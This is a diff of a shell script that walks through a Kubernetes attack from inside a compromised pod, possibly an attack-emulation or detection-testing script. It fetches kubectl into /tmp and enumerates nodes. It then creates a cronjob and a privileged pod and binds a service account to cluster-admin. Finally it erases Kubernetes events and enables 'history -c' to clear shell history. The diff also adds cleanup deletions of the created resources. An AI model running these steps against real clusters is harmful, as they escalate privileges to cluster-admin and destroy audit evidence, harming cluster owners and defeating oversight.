@@ -12,10 +12,9 @@ history
 
 # network discovery
 ip a
-route
 
 # download kubectl
-cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl
+curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl -o /tmp/kubectl
 chmod +x /tmp/kubectl
 
 # discover API server
@@ -24,7 +23,7 @@ curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
 
 # try to find kubelet ip
 # need to use either nmap or kubectl get nodes to find out
-max=$[$(kubectl get no -A | wc -l)-2]
+max=$[$(/tmp/kubectl get no -A | wc -l)-2]
 for (( i=0; i <= $max; ++i ))
 do
 	ip=$(/tmp/kubectl get no -A -o=jsonpath='{.items[$i].status.addresses[0].address}')
@@ -41,30 +40,43 @@ done
 # exec into pod 
 /tmp/kubectl exec nginx sleep 1
 
+# kill pod nginx
+/tmp/kubectl delete po nginx
+
 # cronjob
-/tmp/kubectl create -f /tmp/cronjob.json
+/tmp/kubectl create -f ./cronjob.json
+
+# delete cronjob
+/tmp/kubectl delete -f ./cronjob.json
 
 # local cron?
 
 # run privileged pod
-/tmp/kubectl create -f /tmp/privileged_pod.yaml
+/tmp/kubectl create -f ./privileged_pod.yaml
+
+# remove privileged pod
+/tmp/kubectl delete -f ./privileged_pod.yaml
 
 # create ServiceAccount
 /tmp/kubectl create serviceaccount tester-sa
 
 # bind tester-sa ServiceAccount to cluster-admin
-/tmp/kubectl create -f /tmp/clusterbind.json
+/tmp/kubectl create -f ./clusterbind.json
 
 # run pod with high permissions SA tester-sa
-/tmp/kubectl create -f /tmp/pod_priv_sa.yaml
+/tmp/kubectl create -f ./pod_priv_sa.yaml
 
-# remove privileged pod
-/tmp/kubectl delete pod nginx-priv
+# delete pod with high permissions SA tester-sa
+/tmp/kubectl delete -f ./pod_priv_sa.yaml
+
+# delete bind tester-sa ServiceAccount to cluster-admin
+/tmp/kubectl delete -f ./clusterbind.json
+
+# delete ServiceAccount
+/tmp/kubectl delete serviceaccount tester-sa
 
 # deletion of Kubernetes Events
 /tmp/kubectl delete events --all
 
-# delete files?
-
 # clear command history
-#history -c
+history -c
